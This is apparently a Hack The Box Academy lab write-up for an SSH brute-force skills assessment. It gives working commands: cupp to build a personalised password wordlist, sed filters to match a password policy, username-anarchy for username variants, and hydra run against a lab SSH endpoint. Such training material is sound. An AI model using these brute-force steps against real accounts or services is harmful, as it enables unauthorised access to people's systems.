# Brute Force Skills Assessment Service Login  

[Skills Assessment Service Login](https://academy.hackthebox.com/module/57/section/516)  

>Previous Target user: `Harry Potter`
>Target: `94.237.49.11:30154` - Server: `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1`   

>As you now have the name of an employee from the previous skills assessment question, 
>try to gather basic information about them, and generate a custom password wordlist that meets the password policy. 
>Also use 'usernameGenerator' to generate potential usernames for the employee. 
>Finally, try to brute force the SSH server shown above to get the flag.  

>OSINT about Harry Potter : [Harry Potter - Wikipedia](https://en.wikipedia.org/wiki/Harry_Potter_character)  

```
cupp -i
```  

![skills-assessment-service-login-cupp](/images/skills-assessment-service-login-cupp.png)  

>Based on the company securoty password policy we need to Cleanup the password wordlist `harry.txt`  

```
sed -ri '/^.{,7}$/d' harry.txt
sed -ri '/[!-/:-@\[-`\{-~]+/!d' harry.txt
sed -ri '/[0-9]+/!d' harry.txt
```  

>With username Generator,  Create [custom username wordlist](https://academy.hackthebox.com/module/57/section/512) based on employee full names: `Harry Potter`

```
./username-anarchy Harry Potter > harry-potter-names.txt
```

>SSH Brute Force - User/Pass Wordlists [Service Authentication Brute Forcing](https://academy.hackthebox.com/module/57/section/491)  

```
hydra -L harry-potter-names.txt -P harry.txt -u -f ssh://94.237.49.11:30154 -t 4
```  







>Web application login Credentials discovered using brute force: `user:harrypotter`  
